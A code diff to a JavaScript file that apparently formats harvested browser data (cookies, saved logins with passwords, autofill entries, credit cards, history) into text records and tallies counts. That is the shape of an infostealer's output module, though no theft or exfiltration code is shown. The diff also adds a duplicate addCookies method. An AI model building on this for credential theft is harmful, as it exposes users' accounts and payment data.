@@ -6,7 +6,8 @@ class Cookie {
         this.Expires = Expires;
         this.Name = Name;
         this.Value = Value;
-    }
+    };
+
     write() {
         const isHostSubdomain = this.Host.startsWith('.') ? 'FALSE' : 'TRUE';
         const isExpiresDefined = this.Secure === 0 ? 'FALSE' : 'TRUE';
@@ -29,7 +30,8 @@ class Login {
         this.Username = Username;
         this.Password = Password;
         this.Timestamp = Timestamp;
-    }
+    };
+
     write() {
         return [
             `LoginURL: ${this.LoginURL}`,
@@ -44,7 +46,8 @@ class Autofill {
     constructor(Input, Value) {
         this.Input = Input;
         this.Value = Value;
-    }
+    };
+
     write() {
         return [
             `Input: ${this.Input}`,
@@ -61,7 +64,8 @@ class CreditCard {
         this.Address = Address;
         this.Nickname = Nickname;
         this.Expiration = `${ExpirationMonth}/${ExpirationYear}`;
-    }
+    };
+
     write() {
         return [
             `Guid: ${this.Guid}`,
@@ -80,7 +84,8 @@ class History {
         this.Title = Title;
         this.VisitCount = VisitCount;
         this.Timestamp = Timestamp;
-    }
+    };
+
     write() {
         return [
             `URL: ${this.URL}`,
@@ -96,7 +101,8 @@ class Download {
         this.URL = URL;
         this.TargetPath = TargetPath;
         this.TotalBytes = TotalBytes;
-    }
+    };
+
     write() {
         return [
             `URL: ${this.URL}`,
@@ -111,7 +117,8 @@ class Bookmark {
         this.URL = URL;
         this.TargetName = TargetName;
         this.Timestamp = Timestamp;
-    }
+    };
+
     write() {
         return [
             `URL: ${this.URL}`,
@@ -130,10 +137,12 @@ class BrowserAllStatistics {
         this.loginsCount = 0;
         this.credirCardsCount = 0;
         this.cookiesCount = 0;
+        this.sites = [];
         this.cookies = [];
         this.logins = [];
         this.users = [];
-    }
+    };
+
     updateStatistics(downloadsCount, historysCount, bookmarksCount, autofillsCount, loginsCount, credirCardsCount, cookiesCount) {
         this.downloadsCount = downloadsCount;
         this.historysCount = historysCount;
@@ -142,22 +151,37 @@ class BrowserAllStatistics {
         this.loginsCount = loginsCount;
         this.credirCardsCount = credirCardsCount;
         this.cookiesCount = cookiesCount;
-    }
+    };
+
+    addSites(value) {
+        if (!this.sites.includes(value)) {
+            this.sites.push(value);
+        }
+    };
+
     addCookies(value) {
         if (!this.cookies.includes(value)) {
             this.cookies.push(value);
         }
-    }
+    };
+
+    addCookies(value) {
+        if (!this.cookies.includes(value)) {
+            this.cookies.push(value);
+        }
+    };
+
     addLogins(value) {
         if (!this.logins.includes(value)) {
             this.logins.push(value);
         }
-    }
+    };
+
     addUsers(value) {
         if (!this.users.includes(value)) {
             this.users.push(value);
         }
-    }
+    };
 };
 
 const BrowserStatistics = new BrowserAllStatistics();
